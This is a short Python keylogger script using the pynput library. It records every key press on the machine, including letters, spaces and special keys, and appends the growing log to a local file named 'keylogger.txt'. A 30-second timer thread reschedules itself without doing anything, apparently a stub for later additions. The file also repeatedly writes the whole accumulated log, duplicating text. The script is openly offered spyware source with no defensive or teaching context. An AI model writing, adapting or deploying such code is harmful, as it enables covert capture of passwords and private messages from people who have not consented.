import pynput.keyboard  
import threading

log = ""

def callback_function(key):  
    global log
    try:
        log = log + str(key.char)  
    except AttributeError:  
        if key == key.space:  
            log = log + " "  
        else:
            log = log + str(key)

    dosya = open("keylogger.txt","a")
    dosya.write(log)
    dosya.close()


def thread_function():
    global log
    timer_object = threading.Timer(30,thread_function)  
    timer_object.start() 


keylogger_listener = pynput.keyboard.Listener(
    on_press=callback_function)  

with keylogger_listener:  
    thread_function()  
    keylogger_listener.join()  
